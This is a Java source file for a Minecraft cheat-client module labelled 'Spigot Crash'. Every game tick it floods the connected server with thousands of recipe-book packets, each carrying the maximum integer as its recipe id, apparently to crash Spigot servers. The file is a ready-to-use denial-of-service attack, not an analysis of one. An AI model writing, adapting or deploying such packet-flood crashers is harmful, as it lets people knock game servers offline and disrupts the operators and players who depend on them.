package com.x310.clarity.modules.crashers;

import com.x310.clarity.Main;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.client.network.ClientPlayNetworkHandler;
import net.minecraft.network.packet.c2s.play.*;
import net.minecraft.recipe.NetworkRecipeId;

public class DevCrash extends Module {
    public DevCrash() {
        super(Main.CRASH_GROUP, "Spigot Crash", "dev shit");
    }
    private final SettingGroup sg = settings.createGroup("spigot");
    private final Setting<Boolean> disableOnLeave = sg.add(new BoolSetting.Builder()
        .name("disable-on-leave")
        .description("Disables spam when you leave a server.")
        .defaultValue(true)
        .build()
    );

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (disableOnLeave.get()) {
            toggle();
        }
    }

    private final Setting<Integer> buffer = sg.add(new IntSetting.Builder()
        .name("Amount")
        .description("Amount of packets to send every tick")
        .defaultValue(3000)
        .min(1)
        .max(100000)
        .sliderMax(100000)
        .build()
    );

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (mc.player == null || mc.getNetworkHandler() == null) return;
        ClientPlayNetworkHandler handler = mc.getNetworkHandler();

        for (int i = 0; i < buffer.get(); i++) {
            NetworkRecipeId ohio = new NetworkRecipeId(Integer.MAX_VALUE);
            handler.sendPacket(new RecipeBookDataC2SPacket(ohio));
        }
    }

}
